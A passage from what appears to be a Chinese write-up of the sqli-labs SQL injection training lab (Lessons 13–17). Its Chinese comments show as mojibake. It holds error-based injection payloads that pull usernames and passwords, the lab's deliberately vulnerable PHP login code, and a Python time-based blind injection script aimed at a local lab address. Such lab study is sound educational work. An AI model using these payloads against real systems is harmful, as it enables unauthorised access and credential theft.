punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-</strong>13</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39;) and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;æ­¤å¤„åŠ å…¥æƒ³æ’é™¤çš„å­—ç¬¦ï¼Œå¯å¾€åæŸ¥æ‰¾&#39; )));#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$uname</span></span>') and password=('<span class="token interpolation"><span class="token variable">$passwd</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span><span class="token comment">//echo " You Have successfully logged in " ;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Login name:'. $row['username'];</span><span class="token comment">//echo "&lt;br>";</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span><span class="token comment">//echo "&lt;br>";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"   />'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Try again looser";</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-</strong>14</h1><p>payload:</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;æ­¤å¤„åŠ å…¥æƒ³æ’é™¤çš„å­—ç¬¦ï¼Œå¯å¾€åæŸ¥æ‰¾&#39; )));#</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=<span class="token interpolation"><span class="token variable">$uname</span></span> and password=<span class="token interpolation"><span class="token variable">$passwd</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span><span class="token comment">//echo " You Have successfully logged in " ;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Login name:'. $row['username'];</span><span class="token comment">//echo "&lt;br>";</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span><span class="token comment">//echo "&lt;br>";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg" />'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Try again looser";</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"  />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-</strong>15</h1><p>Pythonï¼ˆç›²æ³¨ï¼‰:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token comment"># config-start</span>sleep_time <span class="token operator">=</span> <span class="token number">1</span>error_time <span class="token operator">=</span> <span class="token number">0.1</span><span class="token comment"># config-end</span><span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># admin' or ()-- </span>    column_name<span class="token operator">=</span><span class="token string">"password"</span>    table_name<span class="token operator">=</span><span class="token string">"username"</span>    database_name<span class="token operator">=</span><span class="token string">"users"</span>    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))="</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span><span class="token comment">#æ­¤å¤„æ›´æ”¹sqlè¯­å¥</span>    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span><span class="token string">"' or (("</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">") and sleep("</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sleep_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"))-- "</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">exce</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>queryASCII<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># content-start</span>    url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:801/sqli/Less-15/"</span>    postData <span class="token operator">=</span> getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>queryASCII<span class="token punctuation">)</span>    before_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postData<span class="token punctuation">)</span>    after_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># content-end</span>    use_time <span class="token operator">=</span> after_time <span class="token operator">-</span> before_time    <span class="token comment"># judge-start</span>    <span class="token comment"># å½“sleepå‡½æ•°è¢«æ‰§è¡Œ , è¯´æ˜æŸ¥è¯¢æ˜¯æ­£ç¡®çš„ (å› ä¸ºç©·ä¸¾æ¯•ç«Ÿé”™è¯¯çš„æƒ…å†µæ›´å¤š , è¦æ„é€ SQLè¯­å¥è®©æ­£ç¡®çš„æƒ…å†µæ‰§è¡Œsleepå‡½æ•°ä»è€Œæé«˜æ•ˆç‡)</span>    <span class="token comment"># å½“ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™ , æ§åˆ¶æ­£ç¡®/é”™è¯¯çš„æ—¶å€™æ‰§è¡Œsleepå‡½æ•°å°±ä¸é‚£ä¹ˆé‡è¦äº†</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>use_time<span class="token punctuation">)</span> <span class="token operator">></span> error_time<span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment"># judge-end</span><span class="token keyword">def</span> <span class="token function">doSearch</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># æ ¹æ®æ•°æ®åº“ä¸­å‡ºç°çš„å­—ç¬¦çš„é¢‘ç‡é¡ºåºé‡æ–°æ„é€ åˆ—è¡¨è¿›è¡ŒæŸ¥è¯¢</span>    order <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'!'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> queryChar <span class="token keyword">in</span> order<span class="token punctuation">:</span>        queryASCII <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>queryChar<span class="token punctuation">)</span>        <span class="token keyword">if</span> exce<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>queryASCII<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>queryASCII<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># éœ€è¦éå†çš„æŸ¥è¯¢ç»“æœçš„æ•°é‡</span>        counter <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># ç»“æœçš„é•¿åº¦</span>            counter <span class="token operator">+=</span> <span class="token number">1</span>            temp <span class="token operator">=</span> doSearch<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token comment"># ä»255å¼€å§‹æŸ¥è¯¢</span>            <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># å½“ä¸º1çš„æ—¶å€™è¯´æ˜å·²ç»æŸ¥è¯¢ç»“æŸ</span>                <span class="token keyword">break</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> counter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># å½“ç»“æœé›†çš„æ‰€æœ‰è¡Œéƒ½è¢«éå†åé€€å‡º</span>            <span class="token keyword">break</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>search<span class="token punctuation">(</span><span class="token punctuation">)</span>ä»£ç æ¥æºï¼šhttps<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>e5a42373ed12</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "#0000ff">';</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span><span class="token comment">//echo " You Have successfully logged in\n\n " ;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Login name:'. $row['username'];</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Try again looser";</span><span class="token comment">//print_r(mysql_error());</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-</strong>16</h1><p>æŠŠLess-15è„šæœ¬SQLè¯­å¥ä¸­å‰é¢çš„â€ â€˜ â€œæ¢æˆâ€ â€œ) â€œå³å¯</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-</strong>17</h1><p>php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//including the Mysql connect parameters.</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//æ£€æŸ¥æ˜¯å¦ä¸ºç©º</span><span class="token punctuation">&#123;</span><span class="token comment">// truncation (see comments)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æˆªå–å‰é¢15ä¸ªå­—ç¬¦</span><span class="token punctuation">&#125;</span><span class="token comment">// Stripslashes if magic quotes enabled</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//æ­¤æ–¹æ³•å½“magic_quotes_gpcå¼€å¯æ—¶æ‰€æœ‰çš„ ' (å•å¼•å·)ã€" (åŒå¼•å·)ã€\ï¼ˆåæ–œæ ï¼‰å’Œ NULLå­—ç¬¦éƒ½ä¼šè¢«ä¸€ä¸ªåæ–œæ è‡ªåŠ¨è½¬ä¹‰ã€‚ ä½†åœ¨php5.4èµ·å·²ç»è¢«æ”¾å¼ƒï¼Œå§‹ç»ˆè¿”å›false</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤åæ–œæ </span><span class="token punctuation">&#125;</span><span class="token comment">// Quote if not a number</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//çº¯æ•°å­—æ£€æµ‹</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_stringå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œä¼šè¢«è¿›è¡Œè½¬ä¹‰çš„å­—ç¬¦åŒ…æ‹¬ï¼š NULLï¼ˆASCII 0ï¼‰ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ'ï¼Œ" å’Œ Control-Z. </span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å˜é‡çš„æ•´æ•°å€¼</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// take the variables</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//making sure uname is not injectable</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//unameè¢«check_inputäº†ï¼Œè¯¦è§ä¸Šé¢çš„ä»£ç </span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//logging the connection parameters to a file for analysis.</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token 